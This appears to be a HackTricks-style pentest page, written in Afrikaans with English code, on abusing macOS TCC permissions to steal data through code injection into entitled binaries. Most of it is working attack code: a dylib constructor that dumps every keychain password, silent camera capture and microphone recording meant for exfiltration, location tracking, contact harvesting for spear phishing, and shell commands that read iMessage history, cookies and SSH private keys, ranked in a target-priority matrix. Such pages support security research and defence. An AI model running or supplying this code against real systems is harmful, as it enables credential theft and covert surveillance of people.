# macOS Kredensiaal- en Datadiefstal via TCC-toestemmings

{{#include ../../../../banners/hacktricks-training.md}}

## Oorsig

macOS TCC (Deursigtigheid, Toestemming en Beheer) beskerm toegang tot sensitiewe gebruikersdata. Wanneer 'n aanvaller **'n binêre kompromitteer wat reeds TCC-toekennings het**, erf hulle daardie toestemmings. Hierdie blad dokumenteer die uitbuitingspotensiaal van elke data-diefstalverwante TCC-toestemming.

> [!WARNING]
> Kod-invoeging in 'n TCC-toegegunde binêre (via DYLD injection, dylib hijacking, or task port) **erf stilweg al sy TCC-toestemmings**. Daar is geen addisionele prompt of verifikasie wanneer dieselfde proses beskermde data lees nie.

---

## Keychain Toegangsgroepe

### Die prys

Die macOS Keychain berg:
- **Wi-Fi passwords** — alle gestoorde draadlose netwerk-inlogbewyse
- **Website passwords** — Safari, Chrome (wanneer Keychain gebruik word), en ander blaaierwagwoorde
- **Application passwords** — e-posrekeninge, VPN-inlogbewyse, ontwikkelings-tokens
- **Certificates and private keys** — code signing, client TLS, S/MIME enkripsie
- **Beveiligde notas** — deur die gebruiker gestoorde geheime

### Entitlement: `keychain-access-groups`

Keychain-items is georganiseer in **toegangsgroepe**. 'n Toepassing se `keychain-access-groups` entitlement lys watter groepe dit kan benader:
```xml
<key>keychain-access-groups</key>
<array>
<string>com.apple.cfnetwork</string>   <!-- Network passwords -->
<string>com.apple.security.personal-information.identity</string>  <!-- Personal certs -->
<string>apple</string>                  <!-- Broad Apple group -->
<string>InternetAccounts</string>       <!-- Internet account passwords -->
</array>
```
### Uitbuiting
```bash
# Find binaries with broad keychain access groups
sqlite3 /tmp/executables.db "
SELECT path FROM executables
WHERE entitlementsString LIKE '%keychain-access-groups%'
AND isAppleBin = 0
ORDER BY privileged DESC;"

# If you can inject into such a binary, enumerate keychain items:
security dump-keychain -d ~/Library/Keychains/login.keychain-db 2>&1 | head -100

# Find specific passwords
security find-generic-password -s "Wi-Fi" -w 2>&1
security find-internet-password -s "github.com" 2>&1
```
### Code Injection → Keychain Theft
```objc
// Injected dylib code — runs with the target's keychain groups
#import <Security/Security.h>

__attribute__((constructor))
void dumpKeychain(void) {
NSDictionary *query = @{
(__bridge id)kSecClass: (__bridge id)kSecClassGenericPassword,
(__bridge id)kSecReturnAttributes: @YES,
(__bridge id)kSecReturnData: @YES,
(__bridge id)kSecMatchLimit: (__bridge id)kSecMatchLimitAll
};

CFArrayRef results = NULL;
OSStatus status = SecItemCopyMatching((__bridge CFDictionaryRef)query, (CFTypeRef *)&results);

if (status == errSecSuccess) {
NSArray *items = (__bridge NSArray *)results;
for (NSDictionary *item in items) {
NSString *service = item[(__bridge id)kSecAttrService];
NSString *account = item[(__bridge id)kSecAttrAccount];
NSData *passData = item[(__bridge id)kSecValueData];
NSString *password = [[NSString alloc] initWithData:passData encoding:NSUTF8StringEncoding];
// service, account, password — the full credential triple
}
}
}
```
---

## Kameratoegang (kTCCServiceCamera)

### Eksploitasie

’n binêre met ’n kamera TCC-toekenning (via `kTCCServiceCamera` or `com.apple.security.device.camera` entitlement) kan foto’s en video opneem:
```bash
# Find camera-authorized binaries
sqlite3 ~/Library/Application\ Support/com.apple.TCC/TCC.db \
"SELECT client FROM access WHERE service='kTCCServiceCamera' AND auth_value=2;"
```
### Stille vaslegging
```objc
// Injected into a camera-entitled process
#import <AVFoundation/AVFoundation.h>

@interface SilentCapture : NSObject <AVCaptureVideoDataOutputSampleBufferDelegate>
@property (strong) AVCaptureSession *session;
@end

@implementation SilentCapture
- (void)startCapture {
self.session = [[AVCaptureSession alloc] init];
AVCaptureDevice *camera = [AVCaptureDevice defaultDeviceWithMediaType:AVMediaTypeVideo];
AVCaptureDeviceInput *input = [AVCaptureDeviceInput deviceInputWithDevice:camera error:nil];
[self.session addInput:input];

AVCaptureVideoDataOutput *output = [[AVCaptureVideoDataOutput alloc] init];
[output setSampleBufferDelegate:self queue:dispatch_get_global_queue(0, 0)];
[self.session addOutput:output];

[self.session startRunning];
// Camera LED turns on — but a brief capture may go unnoticed
}

- (void)captureOutput:(AVCaptureOutput *)output
didOutputSampleBuffer:(CMSampleBufferRef)sampleBuffer
fromConnection:(AVCaptureConnection *)connection {
// Each frame can be saved to disk or exfiltrated
// Stop after capturing a few frames to minimize LED time
[self.session stopRunning];
}
@end
```
> [!TIP]
> Vanaf **macOS Sonoma** is die kamera-aanwyser in die menubalk permanent en kan nie programmaties versteek word nie. Op **ouer macOS-weergawes** mag 'n kort opname nie 'n merkbare aanwyser toon nie.

---

## Mikrofoontoegang (kTCCServiceMicrophone)

### Uitbuiting

Mikrofoontoegang neem alle klank op van die ingeboude mikrofoon, koptelefoon, of gekoppelde audio-invoertoestelle:
```bash
# Find mic-authorized binaries
sqlite3 ~/Library/Application\ Support/com.apple.TCC/TCC.db \
"SELECT client FROM access WHERE service='kTCCServiceMicrophone' AND auth_value=2;"
```
### Attack: Ambient Recording
```objc
// Injected into a mic-entitled process
#import <AVFoundation/AVFoundation.h>

- (void)recordAudio {
NSURL *url = [NSURL fileURLWithPath:@"/tmp/recording.m4a"];
NSDictionary *settings = @{
AVFormatIDKey: @(kAudioFormatMPEG4AAC),
AVSampleRateKey: @44100.0,
AVNumberOfChannelsKey: @1
};
AVAudioRecorder *recorder = [[AVAudioRecorder alloc] initWithURL:url settings:settings error:nil];
[recorder record];
// Records everything: conversations, phone calls, ambient audio

// Stop after a duration
dispatch_after(dispatch_time(DISPATCH_TIME_NOW, 60 * NSEC_PER_SEC),
dispatch_get_main_queue(), ^{
[recorder stop];
// Exfiltrate /tmp/recording.m4a
});
}
```
---

## Liggingopsporing (kTCCServiceLocation)

### Uitbuiting
```bash
# Find location-authorized binaries
sqlite3 ~/Library/Application\ Support/com.apple.TCC/TCC.db \
"SELECT client FROM access WHERE service LIKE '%Location%' AND auth_value=2;"
```
### Deurlopende opsporing
```objc
#import <CoreLocation/CoreLocation.h>

@interface Tracker : NSObject <CLLocationManagerDelegate>
@end

@implementation Tracker
- (void)startTracking {
CLLocationManager *mgr = [[CLLocationManager alloc] init];
mgr.delegate = self;
mgr.desiredAccuracy = kCLLocationAccuracyBest;
[mgr startUpdatingLocation];
}

- (void)locationManager:(CLLocationManager *)manager
didUpdateLocations:(NSArray<CLLocation *> *)locations {
CLLocation *loc = locations.lastObject;
// loc.coordinate.latitude, loc.coordinate.longitude
// Reveals: home address, work address, travel patterns, daily routine
NSString *entry = [NSString stringWithFormat:@"%f,%f,%@\n",
loc.coordinate.latitude, loc.coordinate.longitude, [NSDate date]];
// Append to tracking log
}
@end
```
---

## Kontakte / Kalender / Foto's

### Uittrekking van persoonlike data

| TCC-diens | Raamwerk | Data |
|---|---|---|
| `kTCCServiceAddressBook` | `Contacts.framework` | Name, e-posadresse, telefoonnommers, adresse |
| `kTCCServiceCalendar` | `EventKit` | Vergaderings, deelnemers, liggings |
| `kTCCServicePhotos` | `Photos.framework` | Foto's, skermkiekies, liggingsmetadata |
```bash
# Find authorized binaries for each service
for svc in kTCCServiceAddressBook kTCCServiceCalendar kTCCServicePhotos; do
echo "=== $svc ==="
sqlite3 ~/Library/Application\ Support/com.apple.TCC/TCC.db \
"SELECT client FROM access WHERE service='$svc' AND auth_value=2;"
done
```
### Kontakte-insameling
```objc
#import <Contacts/Contacts.h>

CNContactStore *store = [[CNContactStore alloc] init];
NSArray *keys = @[CNContactGivenNameKey, CNContactFamilyNameKey,
CNContactEmailAddressesKey, CNContactPhoneNumbersKey];
CNContactFetchRequest *request = [[CNContactFetchRequest alloc] initWithKeysToFetch:keys];

[store enumerateContactsWithFetchRequest:request error:nil
usingBlock:^(CNContact *contact, BOOL *stop) {
// contact.givenName, contact.familyName
// contact.emailAddresses, contact.phoneNumbers
// All contacts exfiltrated for social engineering / spear phishing
}];
```
---

## iCloud-rekeningtoegang

### Toestemming: `com.apple.private.icloud-account-access`

Hierdie toestemming laat kommunikasie toe met die `com.apple.iCloudHelper` XPC-diens, en bied toegang tot:
- **iCloud tokens** — verifikasietokens vir die gebruiker se Apple ID
- **iCloud Drive** — gesinkroniseerde dokumente van alle toestelle
- **iCloud Keychain** — wagwoorde gesinkroniseer oor alle Apple-toestelle
- **Find My** — ligging van al die gebruiker se Apple-toestelle
```bash
# Find iCloud-entitled binaries
sqlite3 /tmp/executables.db "
SELECT path FROM executables
WHERE iCloudAccs = 1
ORDER BY privileged DESC;"
```
> [!CAUTION]
> Die kompromittering van 'n iCloud-entitled binêre brei die aanval uit van 'n **enkele toestel na die hele Apple-ekosisteem**: ander Macs, iPhones, iPads, Apple Watch. iCloud Keychain sinkronisering beteken wagwoorde van alle toestelle is toeganklik.

---

## Volledige skyftoegang (kTCCServiceSystemPolicyAllFiles)

### Die kragtigste TCC-toestemming

Volledige skyftoegang verleen lees toegang tot **elke lêer op die stelsel**, insluitend:
- Ander apps se data (Messages, Mail, Safari-geskiedenis)
- TCC-databasisse (onthul al die ander toestemmings)
- SSH-sleutels en konfigurasie
- Blaaierkoekies en sessietokens
- Toepassingsdatabasisse en kas
```bash
# Find FDA-granted binaries
sqlite3 ~/Library/Application\ Support/com.apple.TCC/TCC.db \
"SELECT client FROM access WHERE service='kTCCServiceSystemPolicyAllFiles' AND auth_value=2;"

# With FDA, read anything:
cat ~/Library/Messages/chat.db              # iMessage history
cat ~/Library/Safari/History.db             # Safari browsing history
cat ~/Library/Cookies/Cookies.binarycookies # Browser cookies
cat ~/.ssh/id_rsa                           # SSH private key
```
---

## Exploitation Priority Matrix

Wanneer injectable TCC-granted binaries geëvalueer word, prioritiseer volgens datawaarde:

| Prioriteit | TCC Permission | Waarom |
|---|---|---|
| **Krities** | Full Disk Access | Toegang tot alles |
| **Krities** | TCC Manager | Kan enige toestemming toeken |
| **Hoog** | Keychain Access Groups | Alle gestoor wagwoorde |
| **Hoog** | iCloud Account Access | Kompromittering oor meerdere toestelle |
| **Hoog** | Input Monitoring (ListenEvent) | Keylogging |
| **Hoog** | Accessibility | GUI-beheer, self-toekenning |
| **Middel** | Screen Capture | Visuele data-opname |
| **Middel** | Camera + Microphone | Bespionering |
| **Middel** | Contacts + Calendar | Inligting vir social engineering |
| **Laag** | Location | Fisiese opsporing |
| **Laag** | Photos | Persoonlike data |

## Enumeration Script
```bash
#!/bin/bash
echo "=== TCC Credential Theft Surface Audit ==="

echo -e "\n[*] High-value TCC grants (injectable binaries):"
sqlite3 /tmp/executables.db "
SELECT path, tccPermsStr FROM executables
WHERE (noLibVal = 1 OR allowDyldEnv = 1)
AND tccPermsStr IS NOT NULL
AND tccPermsStr != ''
ORDER BY privileged DESC
LIMIT 30;" 2>/dev/null

echo -e "\n[*] Keychain-entitled injectable binaries:"
sqlite3 /tmp/executables.db "
SELECT path FROM executables
WHERE entitlementsString LIKE '%keychain-access-groups%'
AND (noLibVal = 1 OR allowDyldEnv = 1);" 2>/dev/null

echo -e "\n[*] iCloud-entitled binaries:"
sqlite3 /tmp/executables.db "
SELECT path FROM executables WHERE iCloudAccs = 1;" 2>/dev/null
```
## Verwysings

* [Apple Developer — Keychain Services](https://developer.apple.com/documentation/security/keychain_services)
* [Apple Developer — TCC](https://developer.apple.com/documentation/security/protecting-the-user-s-privacy)
* [Objective-See — TCC Exploitation](https://objective-see.org/blog/blog_0x4C.html)
* [OBTS v5.0 — iCloud Token Extraction (Wojciech Regula)](https://www.youtube.com/watch?v=_6e2LhmxVc0)

{{#include ../../../../banners/hacktricks-training.md}}
